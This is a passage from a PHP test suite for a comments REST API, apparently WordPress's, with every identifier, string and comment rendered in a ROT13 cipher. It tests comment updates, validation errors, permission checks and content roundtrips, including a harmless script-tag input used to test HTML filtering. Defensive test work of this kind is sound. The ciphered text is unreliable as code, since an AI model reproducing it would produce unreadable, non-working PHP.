		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->frg_cnenz( 'cbfg', $pbzzrag->pbzzrag_cbfg_VQ );

		// Eha gjvpr gb znxr fher gung gur hcqngr fgvyy fhpprrqf
		// rira vs ab QO ebjf ner hcqngrq.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_fgnghf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 0,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
			)
		);

		$cnenzf = neenl(
			'fgnghf' => 'nccebir',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', $pbzzrag_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbzzrag = $erfcbafr->trg_qngn();
		$hcqngrq = trg_pbzzrag( $pbzzrag_vq );
		$guvf->nffregFnzr( 'nccebirq', $pbzzrag['fgnghf'] );
		$guvf->nffregRdhnyf( 1, $hcqngrq->pbzzrag_nccebirq );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_svryq_qbrf_abg_hfr_qrsnhyg_inyhrf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 0,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_pbagrag'  => 'fbzr pbagrag',
			)
		);

		$cnenzf = neenl(
			'fgnghf' => 'nccebir',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', $pbzzrag_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbzzrag = $erfcbafr->trg_qngn();
		$hcqngrq = trg_pbzzrag( $pbzzrag_vq );
		$guvf->nffregFnzr( 'nccebirq', $pbzzrag['fgnghf'] );
		$guvf->nffregRdhnyf( 1, $hcqngrq->pbzzrag_nccebirq );
		$guvf->nffregFnzr( 'fbzr pbagrag', $hcqngrq->pbzzrag_pbagrag );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_qngr_tzg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'qngr_tzg' => '2015-05-07G10:14:25',
			'pbagrag'  => 'V\'yy or qrrc va gur pbyq, pbyq tebhaq orsber V erpbtavmr Zvffbhev.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbzzrag = $erfcbafr->trg_qngn();
		$hcqngrq = trg_pbzzrag( frys::$nccebirq_vq );
		$guvf->nffregFnzr( $cnenzf['qngr_tzg'], $pbzzrag['qngr_tzg'] );
		$guvf->nffregFnzr( $cnenzf['qngr_tzg'], zlfdy_gb_esp3339( $hcqngrq->pbzzrag_qngr_tzg ) );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_nhgube_rznvy_bayl() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		hcqngr_bcgvba( 'erdhver_anzr_rznvy', 1 );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_rznvy' => 'rxenonccry@fcevatsvryq-ryrzragnel.rqh',
			'pbagrag'      => 'Abj, V qba\'g jnag lbh gb jbeel pynff. Gurfr grfgf jvyy unir ab nssrpg ba lbhe tenqrf. Gurl zreryl qrgrezvar lbhe shgher fbpvny fgnghf naq svanapvny fhpprff. Vs nal.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_rzcgl_nhgube_anzr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		hcqngr_bcgvba( 'erdhver_anzr_rznvy', 1 );

		$cnenzf = neenl(
			'nhgube_anzr'  => '',
			'nhgube_rznvy' => 'rxenonccry@fcevatsvryq-ryrzragnel.rqh',
			'cbfg'         => frys::$cbfg_vq,
			'pbagrag'      => 'Abj, V qba\'g jnag lbh gb jbeel pynff. Gurfr grfgf jvyy unir ab nssrpg ba lbhe tenqrf. Gurl zreryl qrgrezvar lbhe shgher fbpvny fgnghf naq svanapvny fhpprff. Vs nal.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_nhgube_anzr_bayl() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		hcqngr_bcgvba( 'erdhver_anzr_rznvy', 1 );

		$cnenzf = neenl(
			'cbfg'        => frys::$cbfg_vq,
			'nhgube_anzr' => 'Rqan Xenonccry',
			'pbagrag'     => 'Abj, V qba\'g jnag lbh gb jbeel pynff. Gurfr grfgf jvyy unir ab nssrpg ba lbhe tenqrf. Gurl zreryl qrgrezvar lbhe shgher fbpvny fgnghf naq svanapvny fhpprff. Vs nal.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_rzcgl_nhgube_rznvy() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		hcqngr_bcgvba( 'erdhver_anzr_rznvy', 1 );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Rqan Xenonccry',
			'nhgube_rznvy' => '',
			'pbagrag'      => 'Abj, V qba\'g jnag lbh gb jbeel pynff. Gurfr grfgf jvyy unir ab nssrpg ba lbhe tenqrf. Gurl zreryl qrgrezvar lbhe shgher fbpvny fgnghf naq svanapvny fhpprff. Vs nal.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_nhgube_rznvy_gbb_fubeg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Ubzre W. Fvzcfba',
			'nhgube_rznvy' => 'n@o',
			'pbagrag'      => 'va guvf ubhfr, jr borl gur ynjf bs gurezbqlanzvpf!',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'nhgube_rznvy', $qngn['qngn']['cnenzf'] );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_vainyvq_glcr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'glcr' => 'genpxonpx',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_glcr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_jvgu_enj_cebcregl() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'pbagrag' => neenl(
				'enj' => 'Jung gur urpx xvaq bs anzr vf Crefrcubar?',
			),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbzzrag = $erfcbafr->trg_qngn();
		$hcqngrq = trg_pbzzrag( frys::$nccebirq_vq );
		$guvf->nffregFnzr( $cnenzf['pbagrag']['enj'], $hcqngrq->pbzzrag_pbagrag );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_qngr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'pbagrag' => 'pbagrag',
			'qngr'    => 'sbb',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_qngr_tzg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'pbagrag'  => 'pbagrag',
			'qngr_tzg' => 'sbb',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_vainyvq_vq() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'pbagrag' => 'Bu, gurl unir gur vagrearg ba pbzchgref abj!',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/pbzzragf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_vainyvq_cbfg_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->frg_cnenz( 'cbfg', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_cbfg_vq', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_vainyvq_crezvffvba() {
		nqq_svygre( 'erfg_nyybj_nabalzbhf_pbzzragf', '__erghea_gehr' );

		$cnenzf = neenl(
			'pbagrag' => 'Qvfpb Fgh yvxrf qvfpb zhfvp.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$ubyq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 47024
	 */
	choyvp shapgvba grfg_hcqngr_pbzzrag_jura_pna_zbqrengr_pbzzragf() {
		jc_frg_pheerag_hfre( frys::$zbqrengbe_vq );

		$cnenzf = neenl(
			'pbagrag' => 'Hcqngrq pbzzrag.',
			'qngr'    => '2019-10-07G23:14:25',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbzzrag = $erfcbafr->trg_qngn();
		$hcqngrq = trg_pbzzrag( frys::$nccebirq_vq );

		$guvf->nffregFnzr( $cnenzf['pbagrag'], $hcqngrq->pbzzrag_pbagrag );
		$guvf->nffregFnzr( frys::$cbfg_vq, $pbzzrag['cbfg'] );
		$guvf->nffregFnzr( '2019-10-07G23:14:25', $pbzzrag['qngr'] );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_cevingr_cbfg_vainyvq_crezvffvba() {
		$cevingr_pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cevingr_vq,
				'hfre_vq'          => 0,
			)
		);

		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'pbagrag' => 'Qvfpb Fgh yvxrf qvfpb zhfvp.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', $cevingr_pbzzrag_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_jvgu_puvyqera_yvax() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq_1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$puvyq_pbzzrag = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		// Purpx vs pbzzrag 1 qbrf abg unir gur puvyq yvax.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%f', $pbzzrag_vq_1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlAbgUnfXrl( 'puvyqera', $erfcbafr->trg_yvaxf() );

		// Punatr gur pbzzrag cnerag.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%f', $puvyq_pbzzrag ) );
		$erdhrfg->frg_cnenz( 'cnerag', $pbzzrag_vq_1 );
		$erdhrfg->frg_cnenz( 'pbagrag', 'sbb one' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		// Purpx vs pbzzrag 1 abj unf gur puvyq yvax.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%f', $pbzzrag_vq_1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlUnfXrl( 'puvyqera', $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @gvpxrg 38477
	 */
	choyvp shapgvba grfg_hcqngr_pbzzrag_nhgube_anzr_gbb_ybat() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'nhgube_anzr' => enaq_ybat_fge( 246 ),
			'pbagrag'     => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'pbzzrag_nhgube_pbyhza_yratgu', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 38477
	 */
	choyvp shapgvba grfg_hcqngr_pbzzrag_nhgube_rznvy_gbb_ybat() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'nhgube_rznvy' => 'zhecul@' . enaq_ybat_fge( 190 ) . '.pbz',
			'pbagrag'      => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'pbzzrag_nhgube_rznvy_pbyhza_yratgu', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 38477
	 */
	choyvp shapgvba grfg_hcqngr_pbzzrag_nhgube_hey_gbb_ybat() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'nhgube_hey' => 'uggc://wnmm.' . enaq_ybat_fge( 185 ) . '.pbz',
			'pbagrag'    => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'pbzzrag_nhgube_hey_pbyhza_yratgu', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 38477
	 */
	choyvp shapgvba grfg_hcqngr_pbzzrag_pbagrag_gbb_ybat() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'pbagrag' => enaq_ybat_fge( 66525 ),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'pbzzrag_pbagrag_pbyhza_yratgu', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 39732
	 */
	choyvp shapgvba grfg_hcqngr_pbzzrag_vf_jc_reebe() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'pbagrag' => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
		);

		nqq_svygre( 'jc_hcqngr_pbzzrag_qngn', neenl( $guvf, '_jc_hcqngr_pbzzrag_qngn_svygre' ), 10, 3 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		erzbir_svygre( 'jc_hcqngr_pbzzrag_qngn', neenl( $guvf, '_jc_hcqngr_pbzzrag_qngn_svygre' ), 10, 3 );

		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_snvyrq_rqvg', $erfcbafr, 500 );
	}

	/**
	 * Oybpxf pbzzragf sebz orvat hcqngrq ol ergheavat JC_Reebe.
	 */
	choyvp shapgvba _jc_hcqngr_pbzzrag_qngn_svygre( $qngn, $pbzzrag, $pbzzragnee ) {
		erghea arj JC_Reebe( 'pbzzrag_jebat', 'jc_hcqngr_pbzzrag_qngn svygre snvyf sbe guvf pbzzrag.', neenl( 'fgnghf' => 500 ) );
	}

	choyvp shapgvba irevsl_pbzzrag_ebhaqgevc( $vachg = neenl(), $rkcrpgrq_bhgchg = neenl() ) {
		// Perngr gur pbzzrag.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'nhgube_rznvy', 'pot@naqebvqfqhatrba.pbz' );
		$erdhrfg->frg_cnenz( 'cbfg', frys::$cbfg_vq );
		sbernpu ( $vachg nf $anzr => $inyhr ) {
			$erdhrfg->frg_cnenz( $anzr, $inyhr );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		$guvf->nffregVfNeenl( $npghny_bhgchg['pbagrag'] );
		$guvf->nffregNeenlUnfXrl( 'enj', $npghny_bhgchg['pbagrag'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['enj'], $npghny_bhgchg['pbagrag']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['eraqrerq'], gevz( $npghny_bhgchg['pbagrag']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['nhgube_anzr'], $npghny_bhgchg['nhgube_anzr'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['nhgube_hfre_ntrag'], $npghny_bhgchg['nhgube_hfre_ntrag'] );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$pbzzrag = trg_pbzzrag( $npghny_bhgchg['vq'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['enj'], $pbzzrag->pbzzrag_pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['nhgube_anzr'], $pbzzrag->pbzzrag_nhgube );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['nhgube_hfre_ntrag'], $pbzzrag->pbzzrag_ntrag );

		// Hcqngr gur pbzzrag.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', $npghny_bhgchg['vq'] ) );
		sbernpu ( $vachg nf $anzr => $inyhr ) {
			$erdhrfg->frg_cnenz( $anzr, $inyhr );
		}
		// SVKZR Ng yrnfg bar inyhr zhfg punatr, be hcqngr snvyf.
		// Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/38700
		$erdhrfg->frg_cnenz( 'nhgube_vc', '127.0.0.2' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['enj'], $npghny_bhgchg['pbagrag']['enj'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['eraqrerq'], gevz( $npghny_bhgchg['pbagrag']['eraqrerq'] ) );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['nhgube_anzr'], $npghny_bhgchg['nhgube_anzr'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['nhgube_hfre_ntrag'], $npghny_bhgchg['nhgube_hfre_ntrag'] );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$pbzzrag = trg_pbzzrag( $npghny_bhgchg['vq'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['pbagrag']['enj'], $pbzzrag->pbzzrag_pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['nhgube_anzr'], $pbzzrag->pbzzrag_nhgube );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['nhgube_hfre_ntrag'], $pbzzrag->pbzzrag_ntrag );
	}

	choyvp shapgvba grfg_pbzzrag_ebhaqgevc_nf_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$guvf->nffregFnzr( ! vf_zhygvfvgr(), pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_pbzzrag_ebhaqgevc(
			neenl(
				'pbagrag'           => '\b/ ¯\_(ツ)_/¯',
				'nhgube_anzr'       => '\b/ ¯\_(ツ)_/¯',
				'nhgube_hfre_ntrag' => '\b/ ¯\_(ツ)_/¯',
			),
			neenl(
				'pbagrag'           => neenl(
					'enj'      => '\b/ ¯\_(ツ)_/¯',
					'eraqrerq' => '<c>\b/ ¯\_(ツ)_/¯</c>',
				),
				'nhgube_anzr'       => '\b/ ¯\_(ツ)_/¯',
				'nhgube_hfre_ntrag' => '\b/ ¯\_(ツ)_/¯',
			)
		);
	}

	choyvp shapgvba grfg_pbzzrag_ebhaqgevc_nf_rqvgbe_hasvygrerq_ugzy() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregSnyfr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_pbzzrag_ebhaqgevc(
				neenl(
					'pbagrag'           => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'nhgube_anzr'       => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
